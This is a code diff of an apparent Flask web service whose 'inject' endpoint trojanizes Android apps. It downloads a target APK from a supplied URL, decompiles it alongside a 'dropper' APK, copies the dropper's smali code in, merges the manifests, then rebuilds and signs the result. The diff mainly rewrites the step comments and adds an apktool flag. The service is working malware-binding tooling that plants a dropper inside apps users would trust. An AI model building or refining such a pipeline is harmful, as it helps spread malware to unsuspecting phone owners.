@@ -2,7 +2,6 @@ import os
 import subprocess
 import shutil
 import tempfile
-import traceback
 import requests
 import zipfile
 from flask import Flask, request, send_file, jsonify
@@ -26,7 +25,7 @@ def inject():
 
         target = os.path.join(WORK, "target.apk")
         
-        # 1. Python requests se download karo (wget se better hai)
+        # 1. Download APK
         response = requests.get(file_url, stream=True, timeout=60)
         if response.status_code != 200:
             return jsonify({"error": f"Download failed: HTTP {response.status_code}"}), 400
@@ -35,31 +34,30 @@ def inject():
             for chunk in response.iter_content(chunk_size=8192):
                 f.write(chunk)
         
-        # 2. Check karo ki downloaded file valid APK (ZIP) hai ya nahi
         if not zipfile.is_zipfile(target):
-            return jsonify({"error": "Downloaded file is not a valid APK (Link expired or corrupt)"}), 400
+            return jsonify({"error": "Downloaded file is not a valid APK"}), 400
 
-        # 3. Target APK decompile karo
+        # 2. Target APK decompile (-r flag use kiya hai taaki resource crash na ho)
         target_dir = os.path.join(WORK, "target_dir")
         shutil.rmtree(target_dir, ignore_errors=True)
-        res = subprocess.run(f"apktool d -f -o {target_dir} {target}", shell=True, capture_output=True, text=True)
+        res = subprocess.run(f"apktool d -r -f -o {target_dir} {target}", shell=True, capture_output=True, text=True)
         if res.returncode != 0:
             return jsonify({"error": f"Apktool target fail: {res.stderr[:150]}"}), 500
 
-        # 4. Dropper APK decompile karo
+        # 3. Dropper APK decompile
         dropper_dir = os.path.join(WORK, "dropper_dir")
         shutil.rmtree(dropper_dir, ignore_errors=True)
         res = subprocess.run(f"apktool d -f -o {dropper_dir} {DROPPER}", shell=True, capture_output=True, text=True)
         if res.returncode != 0:
             return jsonify({"error": f"Apktool dropper fail: {res.stderr[:150]}"}), 500
 
-        # 5. Smali files copy karo
+        # 4. Smali copy
         src = os.path.join(dropper_dir, "smali")
         dst = os.path.join(target_dir, "smali")
         if os.path.exists(src):
             shutil.copytree(src, dst, dirs_exist_ok=True)
 
-        # 6. Manifest merge karo
+        # 5. Manifest merge
         manifest_path = os.path.join(target_dir, "AndroidManifest.xml")
         with open(manifest_path) as f:
             t = f.read()
@@ -70,13 +68,13 @@ def inject():
         with open(manifest_path, "w") as f:
             f.write(t)
 
-        # 7. Build karo
+        # 6. Build
         unsigned = os.path.join(WORK, "unsigned.apk")
         res = subprocess.run(f"apktool b -f -o {unsigned} {target_dir}", shell=True, capture_output=True, text=True)
         if res.returncode != 0:
             return jsonify({"error": f"Apktool build fail: {res.stderr[:150]}"}), 500
 
-        # 8. Sign karo
+        # 7. Sign
         aligned = os.path.join(WORK, "aligned.apk")
         signed = os.path.join(WORK, "signed.apk")
         subprocess.run(f"zipalign -f -p 4 {unsigned} {aligned}", shell=True, check=True)
